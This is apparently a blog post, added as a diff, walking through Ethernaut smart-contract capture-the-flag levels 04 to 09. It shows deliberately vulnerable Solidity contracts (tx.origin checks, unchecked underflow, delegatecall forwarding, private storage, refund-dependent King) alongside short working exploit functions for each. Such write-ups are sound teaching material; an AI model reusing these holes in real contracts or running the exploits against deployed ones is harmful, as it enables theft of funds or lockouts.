@@ -1,0 +1,317 @@
+################################
+Let's play some more Ethernauts!
+################################
+:slug: lets-play-some-more-ethernauts
+:date: 2023-07-14
+:summary: from 04-Telephone through 08-Vault
+:tags: programming
+:author: capu
+:featured_image:
+
+04-Telephone
+============
+
+Objective
+---------
+Become the contract's owner
+
+Code
+----
+
+.. code-block:: solidity
+
+    function changeOwner(address _owner) public {
+        if (tx.origin != msg.sender) {
+            owner = _owner;
+        }
+    }
+
+Solution
+--------
+This one's cheating. Since the tests are run from a contract, ``msg.sender`` is
+going to be different from ``tx.origin`` already.
+
+A funny thing though, is that the address Foundry sets as the EOA initiating the
+transactions (``0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38``) has assets in a
+few networks, even 0.00001 ETH on mainnet. Figuring out how is foundry's test
+EOA determined is a rabbit hole for another day
+
+05-Token
+========
+
+Objective
+---------
+Increase your balance from the initial 20.
+
+Code
+----
+
+.. code-block:: solidity
+
+    contract Token {
+        mapping(address => uint256) balances;
+        uint256 public totalSupply;
+
+        constructor(uint256 _initialSupply) {
+            balances[msg.sender] = totalSupply = _initialSupply;
+        }
+
+        function transfer(address _to, uint256 _value) public returns (bool) {
+            // We updated this with unchecked so it behaves as per the original code
+            // written to be compiled with solidity ^0.6.0
+            // As of ^0.8.0, arithmetic ops will revert on over/underflow
+            // On ^0.6.0, it will wrap
+            unchecked {
+                require(balances[msg.sender] - _value >= 0);
+                balances[msg.sender] -= _value;
+                balances[_to] += _value;
+                return true;
+            }
+        }
+
+        function balanceOf(address _owner) public view returns (uint256 balance) {
+            return balances[_owner];
+        }
+    }
+
+Solution
+--------
+Yet another one made obsolete by safety improvements to Solidity itself 🙃 now
+it's clear the problem is an overflow in the transfer arithmetic. 
+
+Particularly, the expression inside the require: ``balances[msg.sender] - _value
+>= 0`` will always evaluate to ``true``, because the ``-`` operates on two
+``uint256`` s, which cannot represent negative values
+
+.. code-block:: solidity
+
+    function solution(Token target) internal virtual {
+        target.transfer(address(factory), 21);
+    }
+
+So transferring someone else more 1 more tokens than my balance will cause an
+overflow and assign ``uint256(20 - 21)`` tokens to me. Which is a pretty big
+number.
+
+06-Delegation
+=============
+
+Objective
+---------
+Become the contract owner
+
+Code
+----
+.. code-block:: solidity
+
+    contract Delegate {
+        address public owner;
+
+        constructor(address _owner) {
+            owner = _owner;
+        }
+
+        function pwn() public {
+            owner = msg.sender;
+        }
+    }
+
+    contract Delegation {
+        address public owner;
+        Delegate delegate;
+
+        constructor(address _delegateAddress) {
+            delegate = Delegate(_delegateAddress);
+            owner = msg.sender;
+        }
+
+        fallback() external {
+            (bool result,) = address(delegate).delegatecall(msg.data);
+            if (result) {
+                this;
+            }
+        }
+    }
+
+Solution
+--------
+The ``Delegation`` contract is passed the address of the ``Delegate`` at construction
+time, and forwards all calls to it.
+
+This means the code that'll actually be executed when calling anything on the
+``Delegation`` contract is the one in ``Delegate``.
+
+Then it's a matter of performing the call. It's not necessary to construct the
+call manually, it's enough to cast the ``Delegation`` into a ``Delegate``
+
+.. code-block:: solidity
+
+    function solution(Delegation target) internal virtual {
+        Delegate(address(target)).pwn();
+    }
+
+
+07-Force
+========
+
+Objective
+---------
+This challenge is a bit different, the objective being to make the Force
+contract have a non-zero balance
+
+Code
+----
+\...the contract is empty
+
+Solution
+--------
+An empty contract will revert when called, since it doesn't have a ``receive``
+or ``fallback payable`` function, rejecting ether transfers, with or without
+calldata.
+
+A workaround against this is the ``selfdestruct`` opcode, which will send ETH to
+a contract with no posibility for it to reject it.
+
+.. code-block:: solidity
+
+    contract Emo {
+        constructor()payable{} // solhint-disable no-empty-blocks
+        function kms(address payable beneficiary) public {
+            selfdestruct(beneficiary);
+        }
+    }
+
+.. code-block:: solidity
+
+    function solution(Force target) internal virtual {
+        Emo emo = new Emo{value: 1}();
+        emo.kms(payable(address(target)));
+    }
+
+08-Vault
+========
+
+Objective
+---------
+
+Code
+----
+.. code-block:: solidity
+
+    contract Vault {
+        bool public locked;
+        bytes32 private password;
+
+        constructor(bytes32 _password) {
+            locked = true;
+            password = _password;
+        }
+
+        function unlock(bytes32 _password) public {
+            if (password == _password) {
+                locked = false;
+            }
+        }
+    }
+
+
+Solution
+--------
+
+I think this one's gonna be pretty easy if I look into the ``VaultFactory``. The
+original intended solution was probably to find the password in the level
+creation transaction.
+
+So let's take it as an opportunity to use foundry's api to inspect storage
+slots instead.
+
+.. code-block:: solidity
+
+    function solution(Vault target) internal virtual {
+        bytes32 password = vm.load(address(target), bytes32(uint256(1)));
+        target.unlock(password);
+    }
+
+Curiously enough, the `load` cheatcode takes a ``bytes32`` parameter when I
+always tought of the slots as being indices, which would normally be ``uint256``
+
+It's worth noting that it's not something exclusive to foundry, and an Ethereum
+RPC can answer the query just as well
+
+
+09-King
+=======
+
+Objective
+---------
+Become the king of this contract, and also don't let anyone else become king
+after you.
+
+Code
+----
+.. code-block:: solidity
+
+    contract King {
+        address payable king;
+        uint256 public prize;
+        address payable public owner;
+
+        constructor() payable {
+            owner = payable(msg.sender);
+            king = payable(msg.sender);
+            prize = msg.value;
+        }
+
+        receive() external payable {
+            require(msg.value >= prize || msg.sender == owner);
+            king.transfer(msg.value);
+            king = payable(msg.sender);
+            prize = msg.value;
+        }
+
+        function _king() public view returns (address payable) {
+            return king;
+        }
+    }
+
+
+Solution
+--------
+Let's look into the ``KingFactory`` contract, which determines wether the
+challenge is solved or not:
+
+.. code-block:: solidity
+
+    function validateInstance(address payable _instance, address _player) public override returns (bool) {
+        _player;
+        King instance = King(_instance);
+        (bool result,) = address(instance).call{value: 0}("");
+        !result;
+        return instance._king() != address(this);
+    }
+
+The ``KingFactory`` contract, which is the ``King``'s owner, calls the fallback
+function, but ignores whether it reverts or succeeds.
+
+The ``King`` contract, however, uses a regular ``transfer``, which reverts when
+the callee does.
+
+Then, it's a matter of making a contract without a fallback/receive function
+King.
+
+.. code-block:: solidity
+
+    contract GrumpyKing {
+        function coronate(address payable where) public payable {
+            where.call{value: msg.value}("");
+        }
+    }
+
+.. code-block:: solidity
+
+    function solution(King target) internal virtual {
+        GrumpyKing grumpy = new GrumpyKing();
+        grumpy.coronate{value: 0.001 ether}(payable(target));
+    }
+
+That was fun. See you next week!
